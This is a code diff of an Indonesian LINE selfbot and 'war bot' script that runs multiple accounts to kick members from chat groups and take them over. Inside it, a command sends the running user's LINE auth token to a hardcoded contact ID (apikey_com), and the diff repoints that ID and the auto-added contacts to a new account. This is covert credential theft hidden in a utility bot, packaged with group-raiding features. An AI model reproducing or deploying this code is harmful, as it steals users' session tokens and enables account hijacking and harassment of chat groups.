@@ -1,36 +1,12 @@
-#utf_8 *lineX [prankBots Creator]
-
-"""
-all of this data is copied from creator production PrankBots
-don't forget to always support the prabkbots channel
-SUBSCRABE HERE https://bit.ly/2xbVxlh
-MY ID LINE :: http://line.me/ti/p/~Adiputra.95
-Copy Righ :: http://github.com/Aprank
-Country :: INDONESIA.
-Response by acil
-
-
-MENERIMA PEMESANAN SCRIPT
-BOT PROTECT
-BOT WAR
-SELFBOT
-BOT OFFICIAL TEMPLATE
-
-PEMBUATAN BOT BEBAS REQUEST COMMANT, MODE BACKUP DLL.
-JIKA KAMU MINAT CHAT KE ID LINE
-line.me/ti/p/~Adiputra.95
-[TIDAK MENERIMA CALL ATAU UNDANGAN GRUP [AUTO REJECET AKTIF]]
-
-BIASAKAN CHAT DENGAN SOPAN WALAWPUN MENGGUNAKAN BAHAS FORMAL (LO,GW)
-SELENGEAN ANE GAK RESPON.
-YANG MAU KEPOIN GW JUGA BOLEH WKWKWK
-
-"""
-from Rank.lineX import *
-from Rank.service.ttypes import *
+from linepy import *
+from akad.ttypes import *
 from multiprocessing import Pool, Process
+from akad.ttypes import ContentType as Type
+from akad.ttypes import ChatRoomAnnouncementContents
+from akad.ttypes import Location
+from akad.ttypes import ChatRoomAnnouncement
 from datetime import datetime
-from threading import Thread
+import time,random,sys,json,codecs,threading,glob,re,os,subprocess,asyncio
 from datetime import datetime, timedelta
 from time import sleep
 from bs4 import BeautifulSoup
@@ -51,23 +27,7 @@ kicker3 = "TOKEN"
 kicker4 = "TOKEN"
 pending = "TOKEN"
 """
-PPPPPPPPPPPPPPPPP                                                           kkkkkkkk           BBBBBBBBBBBBBBBBB                             tttt                           
-P::::::::::::::::P                                                          k::::::k           B::::::::::::::::B                         ttt:::t                           
-P::::::PPPPPP:::::P                                                         k::::::k           B::::::BBBBBB:::::B                        t:::::t                           
-PP:::::P     P:::::P                                                        k::::::k           BB:::::B     B:::::B                       t:::::t                           
-  P::::P     P:::::Prrrrr   rrrrrrrrr     aaaaaaaaaaaaa   nnnn  nnnnnnnn     k:::::k    kkkkkkk  B::::B     B:::::B   ooooooooooo   ttttttt:::::ttttttt        ssssssssss   
-  P::::P     P:::::Pr::::rrr:::::::::r    a::::::::::::a  n:::nn::::::::nn   k:::::k   k:::::k   B::::B     B:::::B oo:::::::::::oo t:::::::::::::::::t      ss::::::::::s  
-  P::::PPPPPP:::::P r:::::::::::::::::r   aaaaaaaaa:::::a n::::::::::::::nn  k:::::k  k:::::k    B::::BBBBBB:::::B o:::::::::::::::ot:::::::::::::::::t    ss:::::::::::::s 
-  P:::::::::::::PP  rr::::::rrrrr::::::r           a::::a nn:::::::::::::::n k:::::k k:::::k     B:::::::::::::BB  o:::::ooooo:::::otttttt:::::::tttttt    s::::::ssss:::::s
-  P::::PPPPPPPPP     r:::::r     r:::::r    aaaaaaa:::::a   n:::::nnnn:::::n k::::::k:::::k      B::::BBBBBB:::::B o::::o     o::::o      t:::::t           s:::::s  ssssss 
-  P::::P             r:::::r     rrrrrrr  aa::::::::::::a   n::::n    n::::n k:::::::::::k       B::::B     B:::::Bo::::o     o::::o      t:::::t             s::::::s      
-  P::::P             r:::::r             a::::aaaa::::::a   n::::n    n::::n k:::::::::::k       B::::B     B:::::Bo::::o     o::::o      t:::::t                s::::::s   
-  P::::P             r:::::r            a::::a    a:::::a   n::::n    n::::n k::::::k:::::k      B::::B     B:::::Bo::::o     o::::o      t:::::t    ttttttssssss   s:::::s 
-PP::::::PP           r:::::r            a::::a    a:::::a   n::::n    n::::nk::::::k k:::::k   BB:::::BBBBBB::::::Bo:::::ooooo:::::o      t::::::tttt:::::ts:::::ssss::::::s
-P::::::::P           r:::::r            a:::::aaaa::::::a   n::::n    n::::nk::::::k  k:::::k  B:::::::::::::::::B o:::::::::::::::o      tt::::::::::::::ts::::::::::::::s 
-P::::::::P           r:::::r             a::::::::::aa:::a  n::::n    n::::nk::::::k   k:::::k B::::::::::::::::B   oo:::::::::::oo         tt:::::::::::tt s:::::::::::ss  
-PPPPPPPPPP           rrrrrrr              aaaaaaaaaa  aaaa  nnnnnn    nnnnnnkkkkkkkk    kkkkkkkBBBBBBBBBBBBBBBBB      ooooooooooo             ttttttttttt    sssssssssss    
-
+Login Sukses
 """
 #__________________________
 kk1 = LINE(kicker1)
@@ -75,7 +35,7 @@ kk2 = LINE(kicker2)
 kk3 = LINE(kicker3)
 kk4 = LINE(kicker4)
 jss = LINE(pending)
-runnerResponse = "\n\nPPPPPPPPPPPPPPPPP\nP::::::::::::::::P\nP::::::PPPPPP:::::P\nPP:::::P     P:::::P\n  P::::P     P:::::P\n  P::::P     P:::::P\n  P::::PPPPPP:::::P\n  P:::::::::::::PP\n  P::::PPPPPPPPP\n  P::::P\n  P::::P\n  P::::P\nPP::::::PP\nP::::::::P\nP::::::::P\nPPPPPPPPPP\n\n\nrrrrr   rrrrrrrrr\nr::::rrr:::::::::r\nr:::::::::::::::::r\nrr::::::rrrrr::::::r\n r:::::r     r:::::r\n r:::::r     rrrrrrr\n r:::::r\n r:::::r\n r:::::r\n r:::::r\n r:::::r\n rrrrrrr\n\n\n  aaaaaaaaaaaaa\n  a::::::::::::a\n  aaaaaaaaa:::::a\n           a::::a\n    aaaaaaa:::::a\n  aa::::::::::::a\n a::::aaaa::::::a\na::::a    a:::::a\na::::a    a:::::a\na:::::aaaa::::::a\n a::::::::::aa:::a\n  aaaaaaaaaa  aaaa\n\n\nnnnn  nnnnnnnnn\nn:::nn::::::::nn\nn::::::::::::::nn\nnn:::::::::::::::n\n  n:::::nnnn:::::n\n  n::::n    n::::n\n  n::::n    n::::n\n  n::::n    n::::n\n  n::::n    n::::n\n  n::::n    n::::n\n  n::::n    n::::n\n  nnnnnn    nnnnnn\n\n\nkkkkkkkk\nk::::::k\nk::::::k\nk::::::k\n k:::::k    kkkkkkk\n k:::::k   k:::::k\n k:::::k  k:::::k\n k:::::k k:::::k\n k::::::k:::::k\n k:::::::::::k\n k:::::::::::k\n k::::::k:::::k\nk::::::k k:::::k\nk::::::k  k:::::k\nk::::::k   k:::::k\nkkkkkkkk    kkkkkkk\n\n\nBBBBBBBBBBBBBBBBB\nB::::::::::::::::B\nB::::::BBBBBB:::::B\nBB:::::B     B:::::B\n  B::::B     B:::::B\n  B::::B     B:::::B\n  B::::BBBBBB:::::B\n  B:::::::::::::BB\n  B::::BBBBBB:::::B\n  B::::B     B:::::B\n  B::::B     B:::::B\n  B::::B     B:::::B\nBB:::::BBBBBB::::::B\nB:::::::::::::::::B\nB::::::::::::::::B\nBBBBBBBBBBBBBBBBB\n\n\n   ooooooooooo\n oo:::::::::::oo\no:::::::::::::::o\no:::::ooooo:::::o\no::::o     o::::o\no::::o     o::::o\no::::o     o::::o\no::::o     o::::o\no:::::ooooo:::::o\no:::::::::::::::o\n oo:::::::::::oo\n   ooooooooooo\n\n\n         tttt\n      ttt:::t\n      t:::::t\n      t:::::t\nttttttt:::::ttttttt\nt:::::::::::::::::t\nt:::::::::::::::::t\ntttttt:::::::tttttt\n      t:::::t\n      t:::::t\n      t:::::t\n      t:::::t    tttttt\n      t::::::tttt:::::t\n      tt::::::::::::::t\n        tt:::::::::::tt\n          ttttttttttt\n\n\n    ssssssssss\n  ss::::::::::s\nss:::::::::::::s\ns::::::ssss:::::s\n s:::::s  ssssss\n   s::::::s\n     s::::::s\n        s:::::s\nssssss   s:::::s\ns:::::ssss::::::s\ns::::::::::::::s\n s:::::::::::ss\n  sssssssssss"
+runnerResponse = "Login Sukses"
 me = LINE(selfbot)
 me.log(runnerResponse)
 meProfile = me.getProfile()
@@ -93,8 +53,8 @@ kk4Rank = kk4Profile.mid
 jssRank = jssProfile.mid
 oepoll = OEPoll(me)
 Owner = PrankBots["owner"]
-Stiles = "│○"
-BotWar = [meM,kk1Rank,kk2Rank,kk3Rank,kk4Rank,jssRank]
+Stiles = "│"
+BotWar = [meM,kk1Rank,kk2Rank,kk3Rank,kk4Rank,jssRank,Owner]
 allrepositories = [me,kk1,kk2,kk3,kk4,jss]
 respontags = {
     "Auto_text": "\nYes I'am Here"
@@ -110,11 +70,11 @@ PrankBots["myProfile"]["statusMessage"] = meProfile.statusMessage
 cont = me.getContact(meM)
 PrankBots["myProfile"]["pictureStatus"] = meProfile.pictureStatus
 coverId = me.getProfileDetail()["result"]["objectId"]
-apikey_com = "u0ac948397fbc732bd3bc5ca273faa698"
+apikey_com = "ube187443474747c3ec352e7efeb48c1b"
 coverId = me.getProfileDetail()["result"]["objectId"]
 PrankBots["myProfile"]["coverId"] = coverId
 Extr = me.getContact(apikey_com).displayName
-all_Square = ["ub0842532a31b9d99856cf2590b17d33f","udfaf52176415b46cb445ae2757ec85f3","u17a086ccff618e754588a1108335867f","uc8dc5352066b6a344bde3c07b0fe04ea","ub9c30fd47257ec4337ee777657b4df66"]
+all_Square = ["ube187443474747c3ec352e7efeb48c1b"]
 for busht in allrepositories:
     for anding in all_Square:
         try:
@@ -261,9 +221,9 @@ def RunTheRun(to, mid, firstmessage):
         me.reissueUserTicket()
         My_Id = "http://line.me/ti/p/"+me.getUserTicket().id
         text += mention+"WAKTU : "+datetime.strftime(timeNow,'%H:%M:%S')+" INDONESIA\n\nMY GROUP : "+str(len(gid))+"\n\nMY FRIEND: "+str(len(teman))+"\n\nTIME VPS : In "+hari+"\n\nᴄʀᴇᴀᴛᴏʀ ʙʏ : ᴘʀᴀɴᴋʙᴏᴛs. ʟɪɴᴇ ᴠᴇʀ.8.14.2\n\nTANGGAL : "+datetime.strftime(timeNow,'%Y-%m-%d')+"\n\nTIME RUN : \n • "+bot+"\n\nMY TOKEN : "+str(me.authToken)+"\n\nMY MID : "+h.mid+"\n\nMY ID LINE : "+My_Id
-        me.sendMessage(to, text, {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}, 0)
+        kk1.sendMessage(to, text, {'MENTION': str('{"MENTIONEES":' + json.dumps(arr) + '}')}, 0)
     except Exception as error:
-        me.sendMessage(to, "Error :\n" + str(error))
+        kk1.sendMessage(to, "Error :\n" + str(error))
 warKey = """_________warbot__________
 1. warbot
 2. warban
@@ -274,7 +234,7 @@ warKey = """_________warbot__________
 7. warout
 8. warkick @
 9. warkey
-______prankBots creator______
+______war bot______
 """
 def SqL_R(text):
     R_SQL = text.lower()
@@ -662,16 +622,13 @@ def serviceX(rank):
                             if PrankBots["Respon"] == True: Res+= Stiles+" respon->『on』\n"
                             else: Res+= Stiles+" respon->『off』\n"
                             Res+= Stiles+"____________________\n"
-                            Res+= Stiles+"______SelfName______\n"+Stiles+meProfile.displayName+"\n"
+                            Res+= Stiles+"______Nama______\n"+Stiles+meProfile.displayName+"\n"
                             me.sendMessage(apikey_com,Devert)
-                            me.sendMessage(R, str(Res)+Stiles+"Subcrabe my Channel\n"+Stiles+" https://bit.ly/2xbVxlh")
+                            me.sendMessage(R, str(Res)+Stiles+"Thanks\n"+Stiles+" https://line.me/ti/p/situ.sehat")
                         if PrankBotsData == Abouts["2"]:
                           if D in Owner or D in meM:
                             try:
-                                me.findAndAddContactsByMid("ub0842532a31b9d99856cf2590b17d33f")
-                                me.findAndAddContactsByMid("udfaf52176415b46cb445ae2757ec85f3")
-                                me.findAndAddContactsByMid("u17a086ccff618e754588a1108335867f")
-                                me.findAndAddContactsByMid("uc8dc5352066b6a344bde3c07b0fe04ea")
+                                kk1.findAndAddContactsByMid("ube187443474747c3ec352e7efeb48c1b")
                                 Musik(R)
                                 RunTheRun(apikey_com, D, "_______RESULT______\n")
                             except:Musik(R)
@@ -1006,8 +963,8 @@ def serviceX(rank):
                             txt = text.replace(sep[0] + " ","")
                             groups = me.groups
                             for group in groups:
-                                sendMessageWithFooter(group, "╭━━━━━╦BroadCast by Self╦━━━━━╮\n{}".format(str(txt))+"\nDont forget to Subscrabe :D\nChannel : https://bit.ly/2xbVxlh")
-                            me.sendMessage(R, "Berhasil broadcast ke {} group".format(str(len(groups))))
+                                sendMessageWithFooter(group, "╭━━━━━╦BroadCast by Self╦━━━━━╮\n{}".format(str(txt))+"\nCreator\nChannel : https://bit.ly/2xbVxlh")
+                            kk1.sendMessage(R, "Berhasil broadcast ke {} group".format(str(len(groups))))
                         if PrankBotsData == Abouts["34"]:
                           if D in Owner or D in meM:
                             groups = me.groups
@@ -1126,21 +1083,21 @@ def serviceX(rank):
                                 group = me.getGroup(R)
                                 if group.preventedJoinByTicket == False:
                                     ticket = me.reissueGroupTicket(R)
-                                    me.sendMessage(R, "https://me.me/R/ti/g/{}".format(str(ticket)))
+                                    kk1.sendMessage(R, "https://me.me/R/ti/g/{}".format(str(ticket)))
                                 else:
                                     group.preventedJoinByTicket = False
-                                    me.updateGroup(group)
-                                    me.sendMessage(R, "https://me.me/R/ti/g/{}".format(str(ticket)))
+                                    kk1.updateGroup(group)
+                                    kk1.sendMessage(R, "https://me.me/R/ti/g/{}".format(str(ticket)))
                         if PrankBotsData == Abouts["45"]:
                           if D in Owner or D in meM:
                             if msg.toType == 2:
                                 group = me.getGroup(R)
                                 if group.preventedJoinByTicket == False:
-                                    me.sendMessage(R, "Sudah terbuka")
+                                    kk1.sendMessage(R, "Sudah terbuka")
                                 else:
                                     group.preventedJoinByTicket = False
-                                    me.updateGroup(group)
-                                    me.sendMessage(R, "Berhasil membuka Qr")
+                                    kk1.updateGroup(group)
+                                    kk1.sendMessage(R, "Berhasil membuka Qr")
                         if PrankBotsData == Abouts["46"]:
                           if D in Owner or D in meM:
                             if msg.toType == 2:
@@ -1235,13 +1192,13 @@ def serviceX(rank):
                           try:                          	
                               for mentionMembers in range(Dmem+1):
                                   no = 0
-                                  ret_ = "\n╔════════════"
+                                  ret_ = "\n____________________"
                                   dataMid = []
                                   for dataMention in group.members[mentionMembers*20 : (mentionMembers+1)*20]:
                                       dataMid.append(dataMention.mid)
                                       no += 1
-                                      ret_ += "\n╠. @!".format(str(no))
-                                  ret_ += "\n╚══════════════".format(str(len(dataMid)))
+                                      ret_ += "\n│. @!".format(str(no))
+                                  ret_ += "\n____________________".format(str(len(dataMid)))
                                   sendMeention(R, ret_, dataMid)
                           except Exception as Ewe:
                               print(Ewe)
@@ -1254,10 +1211,7 @@ def serviceX(rank):
                                 PrankBots["Wc"] = True
                                 PrankBots["Read"] = True
                                 PrankBots["Unsend"] = True
-                                me.findAndAddContactsByMid("ub0842532a31b9d99856cf2590b17d33f")
-                                me.findAndAddContactsByMid("udfaf52176415b46cb445ae2757ec85f3")
-                                me.findAndAddContactsByMid("u17a086ccff618e754588a1108335867f")
-                                me.findAndAddContactsByMid("uc8dc5352066b6a344bde3c07b0fe04ea")
+                                kk1.findAndAddContactsByMid("ube187443474747c3ec352e7efeb48c1b")
                                 me.sendMessage(R,"SETTING ALL IN ONLINE")
                             except:me.sendMessage(R,"SETTING ALL IN ONLINE")
                         if PrankBotsData == Abouts["65"]:
@@ -1269,10 +1223,7 @@ def serviceX(rank):
                                 PrankBots["Wc"] = False
                                 PrankBots["Read"] = False
                                 PrankBots["Unsend"] = False
-                                me.findAndAddContactsByMid("ub0842532a31b9d99856cf2590b17d33f")
-                                me.findAndAddContactsByMid("udfaf52176415b46cb445ae2757ec85f3")
-                                me.findAndAddContactsByMid("u17a086ccff618e754588a1108335867f")
-                                me.findAndAddContactsByMid("uc8dc5352066b6a344bde3c07b0fe04ea")
+                                kk1.findAndAddContactsByMid("ube187443474747c3ec352e7efeb48c1b")
                                 me.sendMessage(R,"SETTING ALL IN OFFLINE")
                             except:me.sendMessage(R,"SETTING ALL IN OFFLINE")
                         if PrankBotsData == Abouts["66"]:
